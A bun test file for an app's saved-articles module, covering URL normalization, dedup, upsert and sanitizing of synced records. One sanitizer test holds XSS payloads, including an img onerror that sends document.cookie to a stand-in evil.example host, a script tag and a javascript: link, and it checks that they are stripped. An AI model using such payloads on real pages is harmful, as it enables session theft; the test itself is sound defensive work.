// Saved articles (src/reading/saved-articles.ts, pure parts). The fs read/write
// paths need the Tauri plugin; only the pure helpers run here. Three things must
// not silently regress: the same article saved twice stays one record, an
// inlined base64 image never reaches the records file (a day's article cache is
// 4MB of them), and publishedAt / summaryOnly survive the trip — docs/21 needs
// both the moment anything quotes a saved article.
// Run: bun test.

import { expect, test } from "bun:test";
// parseSavedArticles sanitizes on read, and the sanitizer parses with a
// DOMParser that bun does not have.
import "../support/dom-parser";
import {
  buildSavedArticle,
  formatPublishedAt,
  normalizeArticleUrl,
  parseSavedArticles,
  removeSavedArticleById,
  savedArticleId,
  savedArticlesForTopic,
  upsertSavedArticle,
  type SavedArticle,
  type SavedArticleInput,
} from "../../src/reading/saved-articles";
import { toSavedArticleInput } from "../../src/ui/components/info/saveArticle";
import { articleHtmlForWebview, rewriteImageSrcs } from "../../src/platform/app/image-proxy";

function input(over: Partial<SavedArticleInput> = {}): SavedArticleInput {
  return {
    topicId: "brief",
    url: "https://example.com/a",
    title: "A title",
    source: "src",
    sourceName: "Source",
    publishedAt: "2026-07-20T08:00:00Z",
    summaryOnly: false,
    text: "body text",
    html: "<p>body</p>",
    ...over,
  };
}

// --- normalizeArticleUrl ----------------------------------------------------

test("normalizeArticleUrl lowercases the scheme and host and drops the fragment", () => {
  expect(normalizeArticleUrl("HTTPS://Example.COM/Path#section-2")).toBe(
    "https://example.com/Path",
  );
});

test("normalizeArticleUrl drops a default port", () => {
  expect(normalizeArticleUrl("https://example.com:443/a")).toBe("https://example.com/a");
});

test("normalizeArticleUrl drops tracking params and keeps content params", () => {
  expect(normalizeArticleUrl("https://example.com/a?utm_source=feed&id=42&fbclid=x")).toBe(
    "https://example.com/a?id=42",
  );
});

test("normalizeArticleUrl sorts the params it keeps, so link order is not identity", () => {
  const a = normalizeArticleUrl("https://example.com/a?b=2&a=1");
  const b = normalizeArticleUrl("https://example.com/a?a=1&b=2");
  expect(a).toBe(b);
  expect(a).toBe("https://example.com/a?a=1&b=2");
});

test("normalizeArticleUrl drops a trailing slash but keeps the root path", () => {
  expect(normalizeArticleUrl("https://example.com/a/b/")).toBe("https://example.com/a/b");
  expect(normalizeArticleUrl("https://example.com/")).toBe("https://example.com/");
});

// A value that is not a URL still has to yield a stable id rather than "".
test("normalizeArticleUrl passes a non-URL through, trimmed", () => {
  expect(normalizeArticleUrl("  not a url  ")).toBe("not a url");
});

// --- savedArticleId ---------------------------------------------------------

test("savedArticleId is the normalized URL", () => {
  expect(savedArticleId("https://example.com/a/?utm_medium=rss", "T")).toBe("https://example.com/a");
});

// The briefing's itemId is scoped to a day, so two links that differ only by
// campaign params have to collapse — otherwise tomorrow's briefing re-saves the
// same article as a second record.
test("savedArticleId is the same for the same article reached two ways", () => {
  const fromBriefing = savedArticleId("https://example.com/a?utm_source=briefing", "T");
  const fromShare = savedArticleId("https://example.com/a?utm_source=wechat&fbclid=z", "T");
  expect(fromBriefing).toBe(fromShare);
});

test("savedArticleId falls back to the title when the feed gave no link", () => {
  expect(savedArticleId("", "A title")).toBe("title:A title");
  expect(savedArticleId("   ", "  A title  ")).toBe("title:A title");
});

test("savedArticleId is empty with neither a link nor a title, so nothing is saved", () => {
  expect(savedArticleId("", "")).toBe("");
  expect(savedArticleId("  ", "  ")).toBe("");
});

// --- buildSavedArticle ------------------------------------------------------

test("buildSavedArticle derives the id, pins savedAt and strips inlined images", () => {
  const a = buildSavedArticle(
    input({
      url: "https://example.com/a/?utm_source=feed",
      html: '<p>keep</p><img src="data:image/jpeg;base64,AAAA">',
      text: "  body text  ",
    }),
    1_700_000_000_000,
  );
  expect(a.id).toBe("https://example.com/a");
  expect(a.savedAt).toBe(1_700_000_000_000);
  expect(a.html).toBe("<p>keep</p>");
  expect(a.text).toBe("body text");
});

// Both are what docs/21 needs at quote time: without publishedAt a
// three-month-old piece reads as news, without summaryOnly a summary reads as
// the article.
test("buildSavedArticle carries publishedAt and summaryOnly through", () => {
  const dated = buildSavedArticle(
    input({ publishedAt: "2026-07-20T08:00:00Z", summaryOnly: true }),
    1,
  );
  expect(dated.publishedAt).toBe("2026-07-20T08:00:00Z");
  expect(dated.summaryOnly).toBe(true);

  const full = buildSavedArticle(input({ publishedAt: "", summaryOnly: false }), 1);
  expect(full.publishedAt).toBe("");
  expect(full.summaryOnly).toBe(false);
});

// --- upsertSavedArticle -----------------------------------------------------

test("upsertSavedArticle appends an article the list does not have", () => {
  const first = buildSavedArticle(input({ url: "https://example.com/a" }), 10);
  const second = buildSavedArticle(input({ url: "https://example.com/b" }), 20);
  const list = upsertSavedArticle(upsertSavedArticle([], first), second);
  expect(list.map((a) => a.id)).toEqual(["https://example.com/a", "https://example.com/b"]);
});

// Saving the same article twice is the thing the button will actually do, and it
// must be idempotent: one record, the original savedAt (so the list does not
// reshuffle), and the newer body (a second save may have caught a full text the
// first one missed).
test("upsertSavedArticle re-saves in place: one record, first savedAt, newer body", () => {
  const first = buildSavedArticle(input({ html: "<p>summary</p>", text: "summary" }), 10);
  const again = buildSavedArticle(input({ html: "<p>full text</p>", text: "full text" }), 999);
  const list = upsertSavedArticle(upsertSavedArticle([], first), again);
  expect(list.length).toBe(1);
  expect(list[0].savedAt).toBe(10);
  expect(list[0].html).toBe("<p>full text</p>");
  expect(list[0].text).toBe("full text");
});

test("removeSavedArticleById removes only the named record", () => {
  const a = buildSavedArticle(input({ url: "https://example.com/a" }), 10);
  const b = buildSavedArticle(input({ url: "https://example.com/b" }), 20);
  expect(removeSavedArticleById([a, b], a.id).map((x) => x.id)).toEqual(["https://example.com/b"]);
});

test("savedArticlesForTopic filters by topic, newest save first", () => {
  const mine = buildSavedArticle(input({ url: "https://example.com/1", topicId: "brief" }), 10);
  const newer = buildSavedArticle(input({ url: "https://example.com/2", topicId: "brief" }), 30);
  const other = buildSavedArticle(input({ url: "https://example.com/3", topicId: "jits" }), 20);
  expect(savedArticlesForTopic([mine, newer, other], "brief").map((a) => a.id)).toEqual([
    "https://example.com/2",
    "https://example.com/1",
  ]);
});

// --- parse / display --------------------------------------------------------

// parseSavedArticles takes what readGuardedJson parsed; these tests still start
// from the bytes, so they parse first. A body that will not parse at all never
// reaches it — readGuardedJson quarantines the file instead.
function parseFile(text: string): SavedArticle[] {
  return parseSavedArticles(JSON.parse(text) as unknown)?.articles ?? [];
}

test("parseSavedArticles keeps every record it can identify", () => {
  const good = buildSavedArticle(input(), 1);
  const parsed = parseSavedArticles([
    good,
    // No id, but a url: it gets the id saveArticle would have given it rather
    // than being dropped.
    { url: "https://example.com/no-id", title: "no id" },
    // A field this build does not know is not a reason to drop the record.
    { id: "https://example.com/future", title: "from a newer build", mood: "curious" },
  ]);
  expect(parsed?.articles.map((a) => a.id)).toEqual([
    good.id,
    "https://example.com/no-id",
    "https://example.com/future",
  ]);
  // Nothing was left behind, so the file is not worth setting aside.
  expect(parsed?.repaired).toBe(false);
});

test("parseSavedArticles reports the entries it cannot carry", () => {
  const good = buildSavedArticle(input(), 1);
  // An entry with no identity at all and a duplicate of one already taken: the
  // sync merge turns down a whole file holding either (readCollection), so they
  // cannot be written back — they stay in the quarantined copy.
  const parsed = parseSavedArticles([good, null, { savedAt: 3 }, { id: good.id, title: "twin" }]);
  expect(parsed?.articles.map((a) => a.id)).toEqual([good.id]);
  expect(parsed?.repaired).toBe(true);
});

test("parseSavedArticles turns down a file that is not an array of records", () => {
  expect(parseSavedArticles({ articles: [] })).toBeNull();
  expect(parseSavedArticles("not a list")).toBeNull();
  expect(parseSavedArticles([])).toEqual({ articles: [], repaired: false });
});

// saved-articles.json sits in the synced folder and merges record by record, so
// a record can reach this device without ever having gone through saveArticle:
// a shared folder, a second device, the Drive account. SavedArticleView hands
// `html` to dangerouslySetInnerHTML, so the read is the trust boundary — the
// write-side sanitizing guards nothing against someone who writes the file.
// This walks the whole read path, ending on the exact string the view computes.
function hostileFile(html: string): string {
  return JSON.stringify([
    {
      id: "https://example.com/a",
      topicId: "brief",
      url: "https://example.com/a",
      title: "A title",
      source: "src",
      sourceName: "Source",
      publishedAt: "",
      savedAt: 1,
      summaryOnly: false,
      text: "",
      html,
    },
  ]);
}

test("parseSavedArticles neutralizes a body that arrived over sync, not through saveArticle", () => {
  const [article] = parseFile(
    hostileFile(
      `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
        `<script>alert(1)</script>` +
        `<a href="javascript:alert(2)">go</a>` +
        `<p onmouseover=alert(3)>text</p>`,
    ),
  );
  // What SavedArticleView passes to dangerouslySetInnerHTML.
  const rendered = articleHtmlForWebview(article.html, article.url);
  expect(rendered).not.toContain("onerror");
  expect(rendered).not.toContain("onmouseover");
  expect(rendered).not.toContain("<script");
  expect(rendered).not.toContain("javascript:");
  expect(rendered).toBe("<a>go</a><p>text</p>");
});

// data:image/svg+xml is markup, and the sanitizer keeps an inline data: image
// when the tag holds no other usable URL — so the read strips data images too,
// the same rule the write side applies for size.
test("parseSavedArticles drops an inlined data: image reaching it from the file", () => {
  const [article] = parseFile(
    hostileFile(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`),
  );
  expect(article.html).toBe("<p>a</p><p>b</p>");
});

// The read guard must not chew up an honest record: an article kept yesterday
// renders the same today.
test("parseSavedArticles leaves an ordinary saved body alone", () => {
  const html = `<p>Real prose with <b>bold</b>.</p><img src="https://cdn.example/a.jpg" loading="lazy">`;
  const [article] = parseFile(hostileFile(html));
  expect(article.html).toBe(html);
});

// The read guard runs on every read, so a record that sanitizes to something
// else the second time renders differently the second time. The proxy step is
// in here because it is the one thing downstream that reads the stored src back
// out of the source text.
test("a stored body renders the same on its tenth read as on its first", () => {
  const stored =
    `<p>A &amp; B</p>` +
    `<img src="https://cdn.example/a.jpg?w=640&amp;h=480">` +
    `<img src="https://&amp;#101;vil.example/b.jpg">` +
    `<a href="https://x.example/?q=1&amp;r=2">link</a>`;
  const first = parseFile(hostileFile(stored))[0].html;
  let body = first;
  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
  expect(body).toBe(first);
  expect(first).toContain('src="https://&amp;#101;vil.example/b.jpg"');

  // And the image the proxy is asked to fetch is the URL that was stored, one
  // "&" per separator, not the escaped text.
  const asked: string[] = [];
  rewriteProbe(first, asked);
  expect(asked).toContain("https://cdn.example/a.jpg?w=640&h=480");
  expect(asked).toContain("https://&#101;vil.example/b.jpg");
});

// Cutting the inlined image out is the one step here that is not the
// sanitizer's own, and it can leave text where the sanitizer would have written
// it differently: the <img> was standing between the <pre> start tag and a
// newline the next parse eats, so the code block lost its blank first line on
// the second read and not the first.
test("dropping an inlined image does not leave the body to settle on a later read", () => {
  const stored = `<pre><img src="data:image/png;base64,AAAA">\n  git log\n</pre>`;
  const first = parseFile(hostileFile(stored))[0].html;
  let body = first;
  for (let i = 0; i < 9; i += 1) body = parseFile(hostileFile(body))[0].html;
  expect(body).toBe(first);
  // The newline was the one the tree builder eats after a <pre> start tag; with
  // the image gone it is the first thing in the block, so it goes.
  expect(first).toBe(`<pre>  git log\n</pre>`);
  // A blank line the reader can see is kept, on the first read and the tenth.
  const blank = `<pre><img src="data:image/png;base64,AAAA">\n\n  git log\n</pre>`;
  const kept = parseFile(hostileFile(blank))[0].html;
  expect(kept).toBe(`<pre>\n\n  git log\n</pre>`);
  expect(parseFile(hostileFile(kept))[0].html).toBe(kept);
});

// Collects what rewriteImageSrcs hands the proxy mapper, which outside Tauri is
// never called for real.
function rewriteProbe(html: string, into: string[]): void {
  rewriteImageSrcs(html, (url) => {
    into.push(url);
    return null;
  });
}

test("parseSavedArticles survives a record whose html is not a string", () => {
  const text = JSON.stringify([{ id: "x", html: 42 }, { id: "y" }]);
  expect(parseFile(text).map((a) => a.html)).toEqual(["", ""]);
});

test("formatPublishedAt shows an unparseable date verbatim and nothing for none", () => {
  expect(formatPublishedAt("")).toBe("");
  expect(formatPublishedAt("  ")).toBe("");
  expect(formatPublishedAt("last Tuesday")).toBe("last Tuesday");
  expect(formatPublishedAt("2026-07-20T08:00:00Z")).toBe(
    new Date("2026-07-20T08:00:00Z").toLocaleDateString(),
  );
});

// --- toSavedArticleInput (ui/components/info/saveArticle.ts) ----------------

// summaryOnly is no longer worked out here. The briefing view answers with the
// body and with whether the article itself was ever read (docs/36) — off the
// day's item snapshot on a collector, off the published bodies on a reader —
// and this mapping carries that answer through unchanged.
test("what the view answered with is what gets kept", () => {
  const kept = toSavedArticleInput({
    topicId: "brief",
    meta: {
      title: "A title",
      url: "https://example.com/a",
      source: "src",
      sourceName: "Source",
      publishedAt: "2026-07-20T08:00:00Z",
    },
    body: { html: "<p>body</p>", text: "body", summaryOnly: true },
  });
  expect(kept).toEqual({
    topicId: "brief",
    url: "https://example.com/a",
    title: "A title",
    source: "src",
    sourceName: "Source",
    publishedAt: "2026-07-20T08:00:00Z",
    summaryOnly: true,
    text: "body",
    html: "<p>body</p>",
  });
});
